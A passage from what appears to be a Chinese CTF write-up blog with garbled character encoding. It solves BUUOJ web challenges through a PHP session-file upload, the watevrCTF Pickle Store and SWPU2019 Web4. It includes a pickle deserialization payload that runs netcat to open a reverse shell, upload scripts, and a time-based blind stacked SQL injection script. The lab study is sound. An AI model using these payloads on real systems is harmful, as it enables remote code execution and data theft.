class="hljs-variable">$file_path</span> = <span class="hljs-variable">$dir_path</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$file_path</span> .= <span class="hljs-string">&quot;_&quot;</span>.<span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&quot;sha256&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;up_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>ä¼šæŠŠæ–‡ä»¶åè¿›è¡Œæ‹¼æ¥å¤„ç†ï¼š<code>åå­—_æ–‡ä»¶å†…å®¹ç»è¿‡sha256åŠ å¯†çš„å€¼</code>ï¼Œè¿™æ­£å¥½æ˜¯<code>session</code>æ–‡ä»¶çš„æ ¼å¼ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">hash_file</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>,<span class="hljs-string">&#x27;./localhost/sess&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªé—®é¢˜è§£å†³ï¼Œç¬¬äºŒä¸ªé—®é¢˜ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/var/babyctf/success.txt&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br></code></pre></td></tr></table></figure><p><code>file_exists</code>å‡½æ•°ä¸å…³å¿ƒç›®æ ‡æ˜¯æ–‡ä»¶è¿˜æ˜¯ç›®å½•ï¼Œåªè¦æœ‰è¿™ä¹ˆä¸ªè·¯å¾„å°±èƒ½è¿”å›<code>true</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åˆ›å»ºä¸€ä¸ªç›®æ ‡è·¯å¾„å°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;attr&#x27;</span>);<br><span class="hljs-variable">$dir_path</span> = <span class="hljs-string">&quot;/var/babyctf/&quot;</span>.<span class="hljs-variable">$attr</span>;<br><span class="hljs-comment">//attr=success.txtï¼Œåé¢å†å¸¦å•¥æˆ‘ä»¬æ ¹æœ¬ä¸å…³å¿ƒ</span><br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://8af25a00-06de-4d4b-8452-fadcf1fb7598.node5.buuoj.cn:81/&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;direction&quot;</span>:<span class="hljs-string">&quot;upload&quot;</span>,<br>    <span class="hljs-string">&quot;attr&quot;</span>:<span class="hljs-string">&quot;success.txt&quot;</span><br>&#125;<br>file=&#123;<br>    <span class="hljs-string">&#x27;up_file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>      &#125;<br>r=requests.post(url=url,files=file,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>ç„¶åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://8af25a00-06de-4d4b-8452-fadcf1fb7598.node5.buuoj.cn:81/&quot;</span><br>data=&#123;<br>    <span class="hljs-string">&quot;direction&quot;</span>:<span class="hljs-string">&quot;upload&quot;</span><br>&#125;<br>file=&#123;<br>    <span class="hljs-string">&#x27;up_file&#x27;</span>:(<span class="hljs-string">&quot;sess&quot;</span>,<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;sess&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read())<br>&#125;<br>r=requests.post(url=url,files=file,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>ç„¶åæŠ“åŒ…æŠŠ<code>session</code>å­—æ®µç›´æ¥æ”¹æˆä¹‹å‰hashçš„ç»“æœå°±è¡Œ</p><h4 id="æ€è·¯æ€»ç»“-1"><a href="#æ€è·¯æ€»ç»“-1" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p><code>post</code>æ–‡ä»¶ä¸Šä¼ ã€‚<code>session</code>æœ‰ä»€ä¹ˆç‰¹æ€§ï¼Ÿ<code>session</code>æ–‡ä»¶ï¼Ÿå’Œ<code>PHPSESSID</code>æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ<code>sess_xxxx</code>ï¼Ÿ<code>php</code>ä¸­<code>session</code>çš„ååºåˆ—åŒ–æœºåˆ¶ï¼Ÿ<code>python</code>å†™ä¸Šä¼ æ–‡ä»¶è¡¨å•ï¼Ÿ<code>file</code>?</p><h2 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h2><p>å•†åº—ç±»å‹é¢˜ç›®</p><p><img src="/img/whatevrctfpicklestory1.png" alt="whatevrctfpicklestory1"></p><p>æŠ“åŒ…çœ‹çœ‹ï¼š</p><p><img src="/img/whatevrctfpicklestory2.png" alt="whatevrctfpicklestory2"></p><p><code>base64</code>è§£ç ï¼š</p><p><img src="/img/whatevrctfpicklestory3.png" alt="whatevrctfpicklestory3"></p><p>æœ‰ä¹±ç ï¼Œä¸è¿‡å¤§è‡´èƒ½çœ‹å‡ºæ¥å­˜æœ‰<code>money</code>ï¼Œè´­ä¹°çš„ç‰©å“å’Œç”¨æˆ·èº«ä»½ç ï¼Ÿ</p><p>ç»è¿‡<code>pickle</code>åºåˆ—åŒ–çš„æ•°æ®é€šå¸¸æ˜¯äºŒè¿›åˆ¶æ ¼å¼ï¼Œå†æ™®é€šæ–‡æœ¬ç¼–è¾‘å™¨ä¸­ä¸å¯è¯»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>enc = <span class="hljs-string">&quot;gAN9cQAoWAUAAABtb25leXEBTXwBWAcAAABoaXN0b3J5cQJdcQMoWBQAAABZdW1teSBzbcO2cmfDpXNndXJrYXEEWBUAAABZdW1teSBzdGFuZGFyZCBwaWNrbGVxBVgVAAAAWXVtbXkgc3RhbmRhcmQgcGlja2xlcQZlWBAAAABhbnRpX3RhbXBlcl9obWFjcQdYIAAAADgwNzUzODY5ZmEzODNlOGFjNWQ2YWJhM2FiYWU3ZGMzcQh1Lg==&quot;</span><br><br><span class="hljs-built_in">print</span>(pickle.loads(b64decode(enc)))<br><span class="hljs-comment">#è¿è¡Œåå›æ˜¾:&#123;&#x27;money&#x27;: 380, &#x27;history&#x27;: [&#x27;Yummy smÃ¶rgÃ¥sgurka&#x27;, &#x27;Yummy standard pickle&#x27;, &#x27;Yummy standard pickle&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;80753869fa383e8ac5d6aba3abae7dc3&#x27;&#125;</span><br><br></code></pre></td></tr></table></figure><p>æ³¨æ„æœ€åé‚£ä¸ªå­—æ®µï¼š<code>anti_tamper_hmac</code></p><p><img src="/img/picksroryyyyy1.png" alt="picksroryyyyy1"></p><p>æ‰€ä»¥è¿™é‡Œç›´æ¥ä¿®æ”¹<code>money</code>ç­‰å­—æ®µæ˜¯ä¸ç°å®çš„ï¼Œä¸è¿‡æ—¢ç„¶å·²ç»çŸ¥é“<code>session</code>å­—æ®µä¼šè¢«ååºåˆ—åŒ–ï¼Œé‚£å°±ç›´æ¥è®©ä»–æ‰§è¡Œå‘½ä»¤å°±å¥½äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> commands<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">errorr0</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&quot;ls /&quot;</span>,))<br> <br>a = errorr0()<br>b = pickle.dumps(a)<br>c = base64.b64encode(b)<br><span class="hljs-built_in">print</span> c<br><span class="hljs-comment">#å‚è€ƒï¼šhttps://blog.csdn.net/qq_51295677</span><br></code></pre></td></tr></table></figure><p>(æ³¨æ„è¿™é‡Œä¸èƒ½åˆ©ç”¨<code>ls</code>ç­‰å‘½ä»¤ï¼Œä¼šè¿”å›<code>500</code>ã€‚å¯èƒ½æ˜¯è§£ç åå»æ‰¾<code>moeny</code>ç­‰å­—æ®µæ‰¾ä¸åˆ°æ‰€ä»¥æŠ¥é”™äº†ã€‚å¯ä»¥é€šè¿‡åå¼¹<code>shell</code>)ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip address 9001  -e/bin/sh&#x27;)&quot;</span>,))<br>a = A()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(a)))<br></code></pre></td></tr></table></figure><p><img src="/img/picklestoryyyyyyy2.png" alt="picklestoryyyyyyy2"></p><h4 id="æ€è·¯æ€»ç»“-2"><a href="#æ€è·¯æ€»ç»“-2" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p><code>pickle</code>ååºåˆ—åŒ–ï¼šåºåˆ—åŒ–åçš„æ•°æ®æ ¼å¼ï¼Ÿ<code>dumps</code>å’Œ<code>loads</code>ï¼Ÿå¦‚æœä¸èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤(500)ï¼Œæ˜¯å¦å¯ä»¥è€ƒè™‘åå¼¹<code>shell</code>ï¼Ÿ</p><h2 id="GoogleCTF2019-Quals-Bnv"><a href="#GoogleCTF2019-Quals-Bnv" class="headerlink" title="[GoogleCTF2019 Quals]Bnv"></a>[GoogleCTF2019 Quals]Bnv</h2><p><img src="/img/googlectf2019bnv1.png" alt="googlectf2019bnv1"></p><p>æŠ“åŒ…ï¼š</p><p><img src="/img/googlectf2019bnv2.png" alt="googlectf2019bnv2"></p><p><code>&#123;&quot;message&quot;:&quot;120101345012450101230135012350150&quot;&#125;</code></p><p><code>&#123;&quot;message&quot;:&quot;135601360123502401401250&quot;&#125;</code></p><p><code>&#123;&quot;message&quot;:&quot;1234010123502402340&quot;&#125;</code></p><p>æ„Ÿè§‰è¿™ä¸ª<code>JSON</code>å°±æ˜¯åˆ©ç”¨ç‚¹ä½†ä¸çŸ¥é“è¯¥æ€ä¹ˆç”¨ã€‚ã€‚</p><p><a href="https://blog.csdn.net/cjdgg/article/details/114420160">å‚è€ƒèµ„æ–™</a></p><h2 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h2><p>ç™»å½•ç•Œé¢ï¼Œ<code>URL</code>å€¼å¾—æ³¨æ„ï¼š<code>/index.php?r=Login/Index</code>ï¼Œæ³¨å†ŒåŠŸèƒ½æ²¡å¼€æ”¾</p><p><img src="/img/spuctfweb4-1.png" alt="spuctfweb4-1"></p><p>åˆ©ç”¨ä¼ªåè®®è¯»<code>index.php</code>æ²¡å•¥ç”¨ã€‚ã€‚æŠ“åŒ…çœ‹ä¸‹æ•°æ®æ€ä¹ˆä¼ è¾“çš„ï¼š</p><p><img src="/img/spuctfweb4-2.png" alt="spuctfweb4-2"></p><p>è¯•è¯•<code>SQL</code>æ³¨å…¥å§ï¼Œç”¨æˆ·åæ”¹æˆ<code>admin&#39;</code>ï¼š</p><p><img src="/img/spuctfweb4-3.png" alt="spuctfweb4-3"></p><p>æ‹¿å­—å…¸<code>FUZZ</code>äº†ä¸€ä¸‹å‘ç°æ²¡æœ‰å•¥è¿‡æ»¤ã€‚ã€‚ä¼°è®¡ä¸æ˜¯<code>SQL</code>æ³¨å…¥ï¼Ÿæƒ³åŠæ³•çœ‹çœ‹è¿™ä¸ª<code>Lib/DBTool.php</code>ä¹Ÿæ²¡æ³•çœ‹ã€‚</p><p>åé¢å»çœ‹äº†<code>wp</code>ï¼Œè¯´æ˜¯<code>SQL</code>æ³¨å…¥è€Œä¸”è¿‡æ»¤äº†å¤§å¤šæ•°å…³é”®å­—<code>select</code>å•¥çš„ã€‚ã€‚å¯æ˜¯æˆ‘å¾ˆç¡®å®šæˆ‘åœ¨<code>FUZZ</code>çš„æ—¶å€™<code>select</code>å’Œ<code>123</code>çš„å›æ˜¾æ²¡ä»»ä½•åŒºåˆ«ã€‚ã€‚åé¢å°è¯•<code>admin&#39;</code>å’Œ<code>select&#39;</code>çš„æ—¶å€™å‘ç°ç¬¬ä¸€ä¸ªæŠ¥é”™ç¬¬äºŒä¸ªä¸æŠ¥é”™æ‰çŸ¥é“æ˜¯è¿™ä¹ˆå›äº‹ï¼šåªè¦å›æ˜¾<code>&#123;&quot;code&quot;:&quot;202&quot;,&quot;info&quot;:&quot;error username or password.&quot;&#125;</code>å¯ä»¥çœ‹æˆå…³é”®å­—è¢«è¿‡æ»¤äº†ã€‚ã€‚(å”‰æ„Ÿè§‰è¿™ä¸ª<code>waf</code>å¯¹æˆ‘çš„ç†è§£èƒ½åŠ›æ¥è¯´ä¸å¤ªå‹å¥½)ã€‚åé¢åœ¨<code>FUZZ</code>çš„æ—¶å€™åé¢å¤šåŠ äº†ä¸ªå•å¼•å·(è¿™æ ·ä¸€æ¥å¦‚æœæ²¡è¢«è¿‡æ»¤ç›´æ¥å›æ˜¾è¯­æ³•é”™è¯¯ï¼Œè¿˜æ˜¯å¾ˆå¥½åŒºåˆ†çš„)ã€‚</p><p>çœ‹äº†<code>wp</code>è¯´æ˜¯å †å æ³¨å…¥ï¼Œä¸€å¼€å§‹æƒ³ç”¨ç±»ä¼¼<code>x&#39;;show databases;--+</code>è¿™ç§è¯­å¥ç›´æ¥è·‘åé¢å‘ç°ä¸è¡Œã€‚ã€‚åŸå› å¯èƒ½æ˜¯è¿™ä¸œè¥¿åªèƒ½ç”¨åœ¨<code>mysqli</code>ä¸­ï¼Ÿè€Œè¿™é“é¢˜æ˜¯<code>PDO</code>åœºæ™¯ä¸‹çš„å †å æ³¨å…¥ï¼Œåªèƒ½è€ƒè™‘ç”¨é¢„å¤„ç†æ¥å¤„ç†ã€‚å¾ˆå¥½å¥‡æ˜¯æ€ä¹ˆçœ‹å‡ºæ¥æ˜¯<code>PDO</code>æ³¨å…¥çš„ã€‚ã€‚</p><p><a href="https://syunaht.com/p/2798247945.html">å‚è€ƒèµ„æ–™</a></p><p>å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨å †å æ³¨å…¥ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;   æŠ¥é”™</span><br><span class="hljs-string">admin&#x27;</span><span class="hljs-comment">--+  æŠ¥é”™</span><br><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27;; ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯</span><br><span class="hljs-string">admin&#x27;</span>;<span class="hljs-comment">--+  ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯</span><br><span class="hljs-keyword">admin</span>&quot;   ç™»å½•æˆåŠŸ<br>admin;&#x27;   æŠ¥é”™<br></code></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹å…¶å®ƒå¸ˆå‚…å…³äºå †å æ³¨å…¥çš„åˆ¤æ–­æ–¹æ³•ï¼š</p><p><strong>åŠ å•å¼•å·æŠ¥é”™ï¼ŒåŠ åŒå¼•å·ä¸æŠ¥é”™ï¼ŒåŠ å•å¼•å·å’Œåˆ†å·ä¸æŠ¥é”™ï¼Œè¯´æ˜å­˜åœ¨å †å æ³¨å…¥ã€‚</strong></p><p>ç„¶åç®€å•çœ‹ä¸‹FUZZçš„ç»“æœï¼Œè¿‡æ»¤äº†å¤§é‡ä¸œè¥¿ï¼Œä¸è¿‡SQLè¿™ä¸œè¥¿ä¼šè‡ªåŠ¨æŠŠåå…­è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²</p><p><img src="/img/spuctfweb4-4.png" alt="spuctfweb4-4"></p><p>ç½‘ä¸Šå·çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#author: c1e4r</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#é¢˜ç›®åœ°å€</span><br>    url = <span class="hljs-string">&#x27;&#x27;&#x27;http://568215bc-57ff-4663-a8d9-808ecfb00f7f.node3.buuoj.cn/index.php?r=Login/Login&#x27;&#x27;&#x27;</span><br>    <span class="hljs-comment">#æ³¨å…¥payload</span><br>    payloads = <span class="hljs-string">&quot;asd&#x27;;set @a=0x&#123;0&#125;;prepare ctftest from @a;execute ctftest-- -&quot;</span><br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>        <span class="hljs-comment">#æŸ¥è¯¢payload</span><br>        payload = <span class="hljs-string">&quot;select if(ascii(substr((select flag from flag),&#123;0&#125;,1))=&#123;1&#125;,sleep(3),1)&quot;</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">128</span>):<br>            <span class="hljs-comment">#å°†æ„é€ å¥½çš„payloadè¿›è¡Œ16è¿›åˆ¶è½¬ç å’Œjsonè½¬ç </span><br>            datas = &#123;<span class="hljs-string">&#x27;username&#x27;</span>:payloads.<span class="hljs-built_in">format</span>(str_to_hex(payload.<span class="hljs-built_in">format</span>(i,j))),<span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test213&#x27;</span>&#125;<br>            data = json.dumps(datas)<br>            times = time.time()<br>            res = requests.post(url = url, data = data)<br>            <span class="hljs-keyword">if</span> time.time() - times &gt;= <span class="hljs-number">3</span>:<br>                flag = flag + <span class="hljs-built_in">chr</span>(j)<br>                <span class="hljs-built_in">print</span>(flag)<br>                <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">str_to_hex</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><code>glzjin_wants_a_girl_friend.zip</code></p><p>å…¶ä¸­çš„<code>fun.php</code>å­˜åœ¨æ–‡ä»¶åŒ…å«(user_aotu_loadæ–¹æ³•)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&#x27;user_aotu_load&#x27;</span>))<br>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_aotu_load</span>(<span class="hljs-params"><span class="hljs-variable">$className</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Lib&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$className</span>, <span class="hljs-string">&#x27;Controller&#x27;</span>) !== <span class="hljs-literal">FALSE</span> )<br>&#123;<br><span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Controller&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$className</span>, <span class="hljs-string">&#x27;Model&#x27;</span>) !== <span class="hljs-literal">FALSE</span> )<br>&#123;<br><span class="hljs-variable">$classPath</span> = <span class="hljs-string">&#x27;Model&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$classPath</span> = BASE_PATH . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$classPath&#125;</span>/<span class="hljs-subst">&#123;$className&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$classPath</span>))<br>&#123;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$classPath</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$classPath</span> = BASE_PATH . <span class="hljs-string">&quot;/<span class="hljs-subst">&#123;$classPath&#125;</span>/<span class="hljs-subst">&#123;$className&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$classPath</span>;<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“è¿™ä¸ªæ–¹æ³•åœ¨å“ªé‡Œè¢«è°ƒç”¨äº†ï¼Œçœ‹çœ‹åˆ«çš„æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* æ‰€æœ‰æ§åˆ¶å™¨çš„çˆ¶ç±»</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * åŠ è½½è§†å›¾æ–‡ä»¶</span><br><span class="hljs-comment"> * viewName è§†å›¾åç§°</span><br><span class="hljs-comment"> * viewData è§†å›¾åˆ†é…æ•°æ®</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$viewPath</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;viewPath))<br>&#123;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$viewData</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;viewPath;<br>&#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>å‘ç°äº†ä¸ª<code>loadView</code>æ–¹æ³•ï¼Œå­˜åœ¨<code>extract</code>å’Œ<code>include</code>ã€‚ç°åœ¨ä¼°è®¡è¿™ä¸¤ä¸ªæ–¹æ³•éƒ½èƒ½è¯»<code>flag</code>ï¼Ÿç»§ç»­æ‰¾åœ¨å“ªé‡Œè¢«è°ƒç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* ç”¨æˆ·æ§åˆ¶å™¨</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">// è®¿é—®åˆ—è¡¨</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$params</span> = <span 